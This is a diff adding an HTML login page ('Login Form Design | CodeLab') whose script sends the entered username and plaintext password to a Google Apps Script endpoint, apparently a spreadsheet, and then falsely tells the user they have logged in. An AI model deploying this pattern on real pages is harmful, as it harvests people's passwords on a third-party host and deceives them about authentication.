@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+
+<html lang="en" dir="ltr">
+   <head>
+      <meta charset="utf-8">
+      <title>Login Form Design | CodeLab</title>
+      <link rel="stylesheet" href="login.css">
+   </head>
+   <body background="img.jpg">
+      <div class="wrapper">
+         <div class="title">
+            Login Form
+         </div>
+         <form autocomplete="off" method="post" name="google-sheet">
+            <div class="field">
+               <input type="text" required name="Username">
+               <label>Username</label>
+            </div>
+            <div class="field">
+               <input type="password" required name="Password">
+               <label>Password</label>
+            </div>
+            <div class="content">
+               <div class="checkbox">
+                  <input type="checkbox" id="remember-me">
+                  <label for="remember-me">Remember me</label>
+               </div>
+               <div class="pass-link">
+                  <a href="#">Forgot password?</a>
+               </div>
+            </div>
+            <div class="field">
+               <input type="submit" value="Login"></a>
+            </div>
+            <div class="signup-link" style="border: 1px solid lightgrey;
+            border-radius: 25px;">
+              <p style="color: black; "> Not a member?</p> <a href="#">Signup now</a>
+            </div>
+         </form>
+      </div>
+      <script>
+        const scriptURL = 'https://script.google.com/macros/s/AKfycbzYE-xlJhFSe27KPFdjdAvDamGPyYyjQ3pYftCqrWaBqto8u3asa_Er3APPkj3Yzrj-/exec'
+        const form = document.forms['google-sheet']
+      
+        form.addEventListener('submit', e => {
+          e.preventDefault()
+          fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+            .then(response => alert("You have successfully logged in.Go back to home page!"))
+            .catch(error => console.error('Error!', error.message))
+
+           
+        })
+      </script>
+
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.1/js/bootstrap.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+   </body>
+</html>
